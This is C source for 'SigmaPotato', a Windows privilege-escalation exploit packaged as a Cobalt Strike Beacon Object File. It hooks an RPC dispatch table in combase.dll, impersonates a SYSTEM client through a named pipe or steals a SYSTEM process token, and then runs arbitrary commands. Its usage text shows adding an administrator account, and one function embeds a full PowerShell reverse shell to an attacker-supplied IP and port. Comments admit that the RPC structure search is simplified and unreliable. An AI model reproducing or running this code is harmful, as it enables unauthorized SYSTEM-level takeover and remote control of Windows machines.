#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <objbase.h>
#include <sddl.h>
#include <tlhelp32.h>

// BOF includes for Cobalt Strike
#ifdef BOF
#include "beacon.h"

// Define MODULEINFO structure for BOF
typedef struct _MODULEINFO {
    LPVOID lpBaseOfDll;
    DWORD SizeOfImage;
    LPVOID EntryPoint;
} MODULEINFO, *LPMODULEINFO;

// Function imports for BOF
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CreateProcessWithTokenW(HANDLE, DWORD, LPCWSTR, LPWSTR, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$ImpersonateNamedPipeClient(HANDLE);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$RevertToSelf(VOID);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$ConvertStringSecurityDescriptorToSecurityDescriptorW(LPCWSTR, DWORD, PSECURITY_DESCRIPTOR*, PULONG);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$GetTokenInformation(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$ConvertSidToStringSidW(PSID, LPWSTR*);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateNamedPipeW(LPCWSTR, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, LPSECURITY_ATTRIBUTES);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$ConnectNamedPipe(HANDLE, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$Process32FirstW(HANDLE, LPPROCESSENTRY32W);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$Process32NextW(HANDLE, LPPROCESSENTRY32W);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$K32GetModuleFileNameExW(HANDLE, HMODULE, LPWSTR, DWORD);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$K32EnumProcessModules(HANDLE, HMODULE*, DWORD, LPDWORD);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$K32GetModuleInformation(HANDLE, HMODULE, LPMODULEINFO, DWORD);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateThread(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$TerminateThread(HANDLE, DWORD);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentProcess(VOID);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentThread(VOID);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError(VOID);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap(VOID);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeEx(LPVOID, DWORD);
DECLSPEC_IMPORT VOID WINAPI OLE32$CoUninitialize(VOID);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstance(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CreateBindCtx(DWORD, LPBC*);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CreateObjrefMoniker(LPUNKNOWN, LPMONIKER*);
DECLSPEC_IMPORT VOID WINAPI OLE32$CoTaskMemFree(LPVOID);

#define CreateProcessWithTokenW ADVAPI32$CreateProcessWithTokenW
#define ImpersonateNamedPipeClient ADVAPI32$ImpersonateNamedPipeClient
#define RevertToSelf ADVAPI32$RevertToSelf
#define ConvertStringSecurityDescriptorToSecurityDescriptorW ADVAPI32$ConvertStringSecurityDescriptorToSecurityDescriptorW
#define OpenProcessToken ADVAPI32$OpenProcessToken
#define GetTokenInformation ADVAPI32$GetTokenInformation
#define ConvertSidToStringSidW ADVAPI32$ConvertSidToStringSidW
#define CreateNamedPipeW KERNEL32$CreateNamedPipeW
#define ConnectNamedPipe KERNEL32$ConnectNamedPipe
#define VirtualProtect KERNEL32$VirtualProtect
#define OpenProcess KERNEL32$OpenProcess
#define CreateToolhelp32Snapshot KERNEL32$CreateToolhelp32Snapshot
#define Process32FirstW KERNEL32$Process32FirstW
#define Process32NextW KERNEL32$Process32NextW
#define K32GetModuleFileNameExW KERNEL32$K32GetModuleFileNameExW
#define K32EnumProcessModules KERNEL32$K32EnumProcessModules
#define K32GetModuleInformation KERNEL32$K32GetModuleInformation
#define CreateThread KERNEL32$CreateThread
#define WaitForSingleObject KERNEL32$WaitForSingleObject
#define TerminateThread KERNEL32$TerminateThread
#define CloseHandle KERNEL32$CloseHandle
#define GetCurrentProcess KERNEL32$GetCurrentProcess
#define GetCurrentThread KERNEL32$GetCurrentThread
#define GetLastError KERNEL32$GetLastError
#define HeapAlloc KERNEL32$HeapAlloc
#define HeapFree KERNEL32$HeapFree
#define GetProcessHeap KERNEL32$GetProcessHeap
#define CoInitializeEx OLE32$CoInitializeEx
#define CoUninitialize OLE32$CoUninitialize
#define CoCreateInstance OLE32$CoCreateInstance
#define CreateBindCtx OLE32$CreateBindCtx
#define CreateObjrefMoniker OLE32$CreateObjrefMoniker
#define CoTaskMemFree OLE32$CoTaskMemFree

#define BeaconPrint(fmt, ...) BeaconPrintf(CALLBACK_OUTPUT, fmt, ##__VA_ARGS__)

#else
#include <psapi.h>
#define BeaconPrint printf
#define K32GetModuleFileNameExW GetModuleFileNameExW
#define K32EnumProcessModules EnumProcessModules
#define K32GetModuleInformation GetModuleInformation
#endif

// Constants and structures
#define PIPE_NAME L"\\\\.\\pipe\\SigmaPotato\\pipe\\epmapper"
#define CLIENT_PIPE L"ncacn_np:localhost/pipe/SigmaPotato[\\pipe\\epmapper]"

// GUID for ORCB RPC interface
static const GUID ORCB_RPC_GUID = {0x18f70770, 0x8e64, 0x11cf, {0x9a, 0xf1, 0x00, 0x20, 0xaf, 0x6e, 0x72, 0xf4}};

// Global variables
static HANDLE g_hPipe = INVALID_HANDLE_VALUE;
static HANDLE g_hThread = NULL;
static HANDLE g_hSystemToken = NULL;
static BOOL g_bHooked = FALSE;
static void* g_pOriginalFunction = NULL;
static void* g_pDispatchTable = NULL;

// Function prototypes
int SigmaPotatoMain(char* command, char* ipAddress, int port);
DWORD WINAPI PipeServerThread(LPVOID lpParam);
BOOL HookRPCDispatchTable(void);
void RestoreRPCDispatchTable(void);
BOOL FindCombaseModule(HMODULE* phModule);
BOOL FindRPCStructures(HMODULE hCombase, void** ppDispatchTable, void** ppOriginalFunction);
BOOL CreatePipeServer(void);
BOOL FindSystemToken(void);
int ExecuteCommand(char* command);
int ExecuteReverseShell(char* ipAddress, int port);
void Cleanup(void);

// Simplified RPC hook function
int __stdcall HookedRPCFunction(void* p1, void* p2, void* p3, void* p4) {
    // Create fake endpoint list pointing to our pipe
    wchar_t* endpoints[] = {CLIENT_PIPE, L"ncacn_ip_tcp:invalid"};
    
    // Calculate size needed
    int totalSize = 4; // header
    for (int i = 0; i < 2; i++) {
        totalSize += (wcslen(endpoints[i]) + 1) * 2;
    }
    
    // Allocate memory for the endpoint list
    void* pEndpointList = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, totalSize + 10);
    if (!pEndpointList) return 0;
    
    // Build the endpoint list structure
    char* ptr = (char*)pEndpointList;
    *(WORD*)ptr = (WORD)totalSize;
    ptr += 2;
    *(WORD*)ptr = (WORD)(totalSize - 2);
    ptr += 2;
    
    for (int i = 0; i < 2; i++) {
        wcscpy_s((wchar_t*)ptr, wcslen(endpoints[i]) + 1, endpoints[i]);
        ptr += (wcslen(endpoints[i]) + 1) * 2;
    }
    
    // Return the endpoint list (this is what gets marshaled)
    if (p3) *(void**)p3 = pEndpointList;
    
    return 0;
}

// Main entry point for BOF - CHANGED FROM 'go' TO 'sigma'
#ifdef BOF
void sigma(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    
    char* command = BeaconDataExtract(&parser, NULL);
    char* ipAddress = BeaconDataExtract(&parser, NULL);
    int port = BeaconDataInt(&parser);
    
    if (!command || strlen(command) == 0) {
        BeaconPrint("[!] SigmaPotato - Windows Privilege Escalation\n");
        BeaconPrint("[!] Usage: sigma <command> [ip] [port]\n");
        BeaconPrint("[!] Examples:\n");
        BeaconPrint("[!]   sigma \"whoami\"\n");
        BeaconPrint("[!]   sigma \"net user admin Pass123! /add\"\n");
        BeaconPrint("[!]   sigma \"cmd.exe\" \"192.168.1.100\" \"4444\"\n");
        return;
    }
    
    BeaconPrint("[*] SigmaPotato: Executing '%s'\n", command);
    SigmaPotatoMain(command, ipAddress, port);
}
#else
int main(int argc, char* argv[]) {
    if (argc < 2) {
        BeaconPrint("[!] Usage: %s <command> [ip] [port]\n", argv[0]);
        return 1;
    }
    
    char* command = argv[1];
    char* ipAddress = (argc >= 3) ? argv[2] : NULL;
    int port = (argc >= 4) ? atoi(argv[3]) : 0;
    
    return SigmaPotatoMain(command, ipAddress, port);
}
#endif

int SigmaPotatoMain(char* command, char* ipAddress, int port) {
    BeaconPrint("[+] Starting SigmaPotato exploit...\n");
    
    // Initialize COM
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) {
        BeaconPrint("[-] Failed to initialize COM: 0x%08X\n", hr);
        return 1;
    }
    
    // Hook RPC dispatch table
    if (!HookRPCDispatchTable()) {
        BeaconPrint("[-] Failed to hook RPC dispatch table\n");
        CoUninitialize();
        return 1;
    }
    
    BeaconPrint("[+] Hooked RPC dispatch table\n");
    
    // Create pipe server
    if (!CreatePipeServer()) {
        BeaconPrint("[-] Failed to create pipe server\n");
        RestoreRPCDispatchTable();
        CoUninitialize();
        return 1;
    }
    
    BeaconPrint("[+] Created pipe server\n");
    
    // Start pipe server thread
    g_hThread = CreateThread(NULL, 0, PipeServerThread, NULL, 0, NULL);
    if (!g_hThread) {
        BeaconPrint("[-] Failed to create pipe server thread\n");
        Cleanup();
        return 1;
    }
    
    BeaconPrint("[+] Started pipe server thread\n");
    
    // Simple trigger - try to create a COM object to trigger RPC calls
    IUnknown* pUnknown = NULL;
    GUID clsid = {0x0000030C, 0x0000, 0x0000, {0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}}; // StdMarshal
    GUID iid = {0x00000000, 0x0000, 0x0000, {0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}}; // IUnknown
    
    hr = CoCreateInstance(&clsid, NULL, CLSCTX_LOCAL_SERVER, &iid, (void**)&pUnknown);
    if (SUCCEEDED(hr) && pUnknown) {
        pUnknown->lpVtbl->Release(pUnknown);
    }
    
    BeaconPrint("[+] Triggered COM unmarshaling\n");
    
    // Wait for pipe connection and token capture
    WaitForSingleObject(g_hThread, 5000);
    
    if (g_hSystemToken) {
        BeaconPrint("[+] Successfully obtained SYSTEM token\n");
        
        if (ipAddress && port > 0) {
            ExecuteReverseShell(ipAddress, port);
        } else {
            ExecuteCommand(command);
        }
    } else {
        BeaconPrint("[-] Failed to obtain SYSTEM token\n");
    }
    
    Cleanup();
    CoUninitialize();
    return 0;
}

BOOL HookRPCDispatchTable(void) {
    HMODULE hCombase = NULL;
    void* pDispatchTable = NULL;
    void* pOriginalFunction = NULL;
    
    // Find combase.dll module
    if (!FindCombaseModule(&hCombase)) {
        BeaconPrint("[-] Could not find combase.dll\n");
        return FALSE;
    }
    
    // Find RPC structures in combase
    if (!FindRPCStructures(hCombase, &pDispatchTable, &pOriginalFunction)) {
        BeaconPrint("[-] Could not find RPC structures\n");
        return FALSE;
    }
    
    // Save original values
    g_pDispatchTable = pDispatchTable;
    g_pOriginalFunction = pOriginalFunction;
    
    // Make dispatch table writable
    DWORD oldProtect = 0;
    if (!VirtualProtect(pDispatchTable, sizeof(void*), PAGE_READWRITE, &oldProtect)) {
        BeaconPrint("[-] Failed to make dispatch table writable\n");
        return FALSE;
    }
    
    // Hook the first function in the dispatch table
    *(void**)pDispatchTable = (void*)HookedRPCFunction;
    
    // Restore protection
    VirtualProtect(pDispatchTable, sizeof(void*), oldProtect, &oldProtect);
    
    g_bHooked = TRUE;
    return TRUE;
}

void RestoreRPCDispatchTable(void) {
    if (g_bHooked && g_pDispatchTable && g_pOriginalFunction) {
        DWORD oldProtect = 0;
        VirtualProtect(g_pDispatchTable, sizeof(void*), PAGE_READWRITE, &oldProtect);
        *(void**)g_pDispatchTable = g_pOriginalFunction;
        VirtualProtect(g_pDispatchTable, sizeof(void*), oldProtect, &oldProtect);
        g_bHooked = FALSE;
    }
}

BOOL FindCombaseModule(HMODULE* phModule) {
    HMODULE hModules[1024];
    DWORD cbNeeded;
    HANDLE hProcess = GetCurrentProcess();
    
    if (!K32EnumProcessModules(hProcess, hModules, sizeof(hModules), &cbNeeded)) {
        return FALSE;
    }
    
    DWORD cModules = cbNeeded / sizeof(HMODULE);
    for (DWORD i = 0; i < cModules; i++) {
        wchar_t szModName[MAX_PATH];
        if (K32GetModuleFileNameExW(hProcess, hModules[i], szModName, sizeof(szModName) / sizeof(wchar_t))) {
            wchar_t* pFileName = wcsrchr(szModName, L'\\');
            if (pFileName) {
                pFileName++;
                if (_wcsicmp(pFileName, L"combase.dll") == 0) {
                    *phModule = hModules[i];
                    return TRUE;
                }
            }
        }
    }
    
    return FALSE;
}

BOOL FindRPCStructures(HMODULE hCombase, void** ppDispatchTable, void** ppOriginalFunction) {
    // This is a simplified implementation for demonstration
    // In a real scenario, you'd need to search the module memory for RPC structures
    // containing the ORCB_RPC_GUID and extract the dispatch table
    
    MODULEINFO modInfo;
    if (!K32GetModuleInformation(GetCurrentProcess(), hCombase, &modInfo, sizeof(modInfo))) {
        return FALSE;
    }
    
    // For this simplified version, we'll use a hardcoded offset approach
    // Real implementation would parse PE headers and search for RPC interface structures
    BYTE* pBase = (BYTE*)modInfo.lpBaseOfDll;
    SIZE_T size = modInfo.SizeOfImage;
    
    // Search for GUID pattern (simplified)
    for (SIZE_T i = 0; i < size - sizeof(GUID) - 64; i += 4) {
        if (memcmp(pBase + i, &ORCB_RPC_GUID, sizeof(GUID)) == 0) {
            // Found potential RPC interface, try to extract dispatch table
            // This is highly simplified and may need adjustment for different Windows versions
            void** pPotentialDispatchTable = (void**)(pBase + i + 32);
            if ((BYTE*)*pPotentialDispatchTable > pBase && (BYTE*)*pPotentialDispatchTable < (pBase + size)) {
                *ppDispatchTable = pPotentialDispatchTable;
                *ppOriginalFunction = *pPotentialDispatchTable;
                return TRUE;
            }
        }
    }
    
    return FALSE;
}

BOOL CreatePipeServer(void) {
    SECURITY_ATTRIBUTES sa = {0};
    PSECURITY_DESCRIPTOR pSD = NULL;
    ULONG sdSize = 0;
    
    // Create security descriptor allowing everyone access
    if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(
        L"D:(A;OICI;GA;;;WD)", SDDL_REVISION_1, (PSECURITY_DESCRIPTOR*)&pSD, &sdSize)) {
        return FALSE;
    }
    
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = pSD;
    sa.bInheritHandle = FALSE;
    
    g_hPipe = CreateNamedPipeW(
        PIPE_NAME,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        PIPE_UNLIMITED_INSTANCES,
        512, 512, 0, &sa);
    
    if (pSD) LocalFree(pSD);
    
    return (g_hPipe != INVALID_HANDLE_VALUE);
}

DWORD WINAPI PipeServerThread(LPVOID lpParam) {
    if (g_hPipe == INVALID_HANDLE_VALUE) {
        return 1;
    }
    
    BeaconPrint("[+] Waiting for pipe connection...\n");
    
    // Wait for client connection
    BOOL connected = ConnectNamedPipe(g_hPipe, NULL);
    if (!connected && GetLastError() != ERROR_PIPE_CONNECTED) {
        BeaconPrint("[-] Failed to connect named pipe: %d\n", GetLastError());
        return 1;
    }
    
    BeaconPrint("[+] Pipe connected!\n");
    
    // Impersonate the connected client
    if (!ImpersonateNamedPipeClient(g_hPipe)) {
        BeaconPrint("[-] Failed to impersonate client: %d\n", GetLastError());
        return 1;
    }
    
    BeaconPrint("[+] Successfully impersonated client\n");
    
    // Get current token
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentThread(), TOKEN_ALL_ACCESS, &hToken)) {
        BeaconPrint("[-] Failed to open thread token: %d\n", GetLastError());
        RevertToSelf();
        return 1;
    }
    
    // Check if we have a SYSTEM token
    DWORD tokenInfoSize = 0;
    GetTokenInformation(hToken, TokenUser, NULL, 0, &tokenInfoSize);
    
    if (tokenInfoSize > 0) {
        TOKEN_USER* pTokenUser = (TOKEN_USER*)HeapAlloc(GetProcessHeap(), 0, tokenInfoSize);
        if (pTokenUser) {
            if (GetTokenInformation(hToken, TokenUser, pTokenUser, tokenInfoSize, &tokenInfoSize)) {
                // Check if this is SYSTEM (S-1-5-18)
                LPWSTR pSid = NULL;
                if (ConvertSidToStringSidW(pTokenUser->User.Sid, &pSid)) {
                    if (wcscmp(pSid, L"S-1-5-18") == 0) {
                        BeaconPrint("[+] Obtained SYSTEM token!\n");
                        g_hSystemToken = hToken;
                        hToken = NULL; // Don't close it
                    } else {
                        BeaconPrint("[*] Got token for SID: %S\n", pSid);
                        // Try to find a SYSTEM token in other processes
                        FindSystemToken();
                    }
                    LocalFree(pSid);
                }
            }
            HeapFree(GetProcessHeap(), 0, pTokenUser);
        }
    }
    
    if (hToken) CloseHandle(hToken);
    RevertToSelf();
    
    return 0;
}

BOOL FindSystemToken(void) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return FALSE;
    }
    
    PROCESSENTRY32W pe32 = {0};
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    
    if (!Process32FirstW(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return FALSE;
    }
    
    do {
        // Try to open system processes
        if (pe32.th32ProcessID > 4) { // Skip system and idle
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
            if (hProcess) {
                HANDLE hToken = NULL;
                if (OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
                    DWORD tokenInfoSize = 0;
                    GetTokenInformation(hToken, TokenUser, NULL, 0, &tokenInfoSize);
                    
                    if (tokenInfoSize > 0) {
                        TOKEN_USER* pTokenUser = (TOKEN_USER*)HeapAlloc(GetProcessHeap(), 0, tokenInfoSize);
                        if (pTokenUser) {
                            if (GetTokenInformation(hToken, TokenUser, pTokenUser, tokenInfoSize, &tokenInfoSize)) {
                                LPWSTR pSid = NULL;
                                if (ConvertSidToStringSidW(pTokenUser->User.Sid, &pSid)) {
                                    if (wcscmp(pSid, L"S-1-5-18") == 0) {
                                        BeaconPrint("[+] Found SYSTEM token in PID %d\n", pe32.th32ProcessID);
                                        g_hSystemToken = hToken;
                                        hToken = NULL; // Don't close it
                                        LocalFree(pSid);
                                        HeapFree(GetProcessHeap(), 0, pTokenUser);
                                        CloseHandle(hProcess);
                                        CloseHandle(hSnapshot);
                                        return TRUE;
                                    }
                                    LocalFree(pSid);
                                }
                            }
                            HeapFree(GetProcessHeap(), 0, pTokenUser);
                        }
                    }
                    
                    if (hToken) CloseHandle(hToken);
                }
                CloseHandle(hProcess);
            }
        }
    } while (Process32NextW(hSnapshot, &pe32));
    
    CloseHandle(hSnapshot);
    return FALSE;
}

int ExecuteCommand(char* command) {
    if (!g_hSystemToken) {
        BeaconPrint("[-] No SYSTEM token available\n");
        return 1;
    }
    
    // Convert command to wide string
    int wideLen = MultiByteToWideChar(CP_UTF8, 0, command, -1, NULL, 0);
    wchar_t* wideCommand = (wchar_t*)HeapAlloc(GetProcessHeap(), 0, wideLen * sizeof(wchar_t));
    if (!wideCommand) {
        return 1;
    }
    
    MultiByteToWideChar(CP_UTF8, 0, command, -1, wideCommand, wideLen);
    
    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    
    BOOL result = CreateProcessWithTokenW(
        g_hSystemToken,
        0,
        NULL,
        wideCommand,
        0,
        NULL,
        NULL,
        &si,
        &pi);
    
    if (result) {
        BeaconPrint("[+] Successfully executed: %s\n", command);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        BeaconPrint("[-] Failed to execute command: %d\n", GetLastError());
    }
    
    HeapFree(GetProcessHeap(), 0, wideCommand);
    return result ? 0 : 1;
}

int ExecuteReverseShell(char* ipAddress, int port) {
    // Build PowerShell reverse shell command
    char* psCommand = (char*)HeapAlloc(GetProcessHeap(), 0, 2048);
    if (!psCommand) return 1;
    
    sprintf_s(psCommand, 2048,
        "powershell.exe -Command \"$client = New-Object System.Net.Sockets.TCPClient('%s',%d);"
        "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};"
        "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){"
        "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
        "$sendback = (iex $data 2>&1 | Out-String );"
        "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
        "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};"
        "$client.Close()\"",
        ipAddress, port);
    
    BeaconPrint("[+] Launching reverse shell to %s:%d\n", ipAddress, port);
    int result = ExecuteCommand(psCommand);
    
    HeapFree(GetProcessHeap(), 0, psCommand);
    return result;
}

void Cleanup(void) {
    if (g_hThread) {
        TerminateThread(g_hThread, 0);
        CloseHandle(g_hThread);
        g_hThread = NULL;
    }
    
    if (g_hPipe != INVALID_HANDLE_VALUE) {
        CloseHandle(g_hPipe);
        g_hPipe = INVALID_HANDLE_VALUE;
    }
    
    if (g_hSystemToken) {
        CloseHandle(g_hSystemToken);
        g_hSystemToken = NULL;
    }
    
    RestoreRPCDispatchTable();
}